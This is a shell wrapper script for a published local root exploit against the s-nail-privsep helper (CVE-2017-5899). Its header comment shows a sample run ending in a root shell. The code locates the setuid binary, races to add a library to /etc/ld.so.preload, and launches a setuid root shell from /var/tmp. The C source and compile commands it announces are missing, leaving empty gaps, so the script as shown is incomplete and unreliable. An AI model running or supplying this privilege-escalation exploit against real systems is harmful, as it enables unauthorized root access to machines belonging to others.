#!/bin/sh
# Wrapper for @wapiflapi's s-nail-privget.c local root exploit for CVE-2017-5899
# uses ld.so.preload technique
# ---
# [~] Found privsep: /usr/lib/s-nail/s-nail-privsep
# [.] Compiling /var/tmp/.snail.so.c ...
# [.] Compiling /var/tmp/.sh.c ...
# [.] Compiling /var/tmp/.privget.c ...
# [.] Adding /var/tmp/.snail.so to /etc/ld.so.preload ...
# [=] s-nail-privsep local root by @wapiflapi
# [.] Started flood in /etc/ld.so.preload
# [.] Started race with /usr/lib/s-nail/s-nail-privsep
# [.] This could take a while...
# [.] Race #1 of 1000 ...
# This is a helper program of "s-nail" (in /usr/bin).
#   It is capable of gaining more privileges than "s-nail"
#   and will be used to create lock files.
#   It's sole purpose is outsourcing of high privileges into
#   fewest lines of code in order to reduce attack surface.
#   It cannot be run by itself.
# [.] Race #2 of 1000 ...
# ...
# ...
# ...
# [.] Race #9 of 1000 ...
# [+] got root! /var/tmp/.sh (uid=0 gid=0)
# [.] Cleaning up...
# [+] Success:
# -rwsr-xr-x 1 root root 6336 Jan 13 20:42 /var/tmp/.sh
# [.] Launching root shell: /var/tmp/.sh
# # id
# uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(test)
# ---
# <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2017-5899

base_dir="/var/tmp"
rootshell="${base_dir}/.sh"
privget="${base_dir}/.privget"
lib="${base_dir}/.snail.so"

if test -u "${1}"; then
  privsep_path="${1}"
elif test -u /usr/lib/s-nail/s-nail-privsep; then
  privsep_path="/usr/lib/s-nail/s-nail-privsep"
elif test -u /usr/lib/mail-privsep; then
  privsep_path="/usr/lib/mail-privsep"
else
  echo "[-] Could not find privsep path"
  exit 1
fi
echo "[~] Found privsep: ${privsep_path}"

if ! test -w "${base_dir}"; then
  echo "[-] ${base_dir} is not writable"
  exit 1
fi

echo "[.] Compiling ${lib}.c ..."



echo "[.] Compiling ${rootshell}.c ..."



echo "[.] Compiling ${privget}.c ..."



echo "[.] Adding ${lib} to /etc/ld.so.preload ..."

echo | $privget "${privsep_path}"

echo '[.] Cleaning up...'



if ! test -u "${rootshell}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo '[+] Success:'
/bin/ls -la "${rootshell}"

echo "[.] Launching root shell: ${rootshell}"
$rootshell
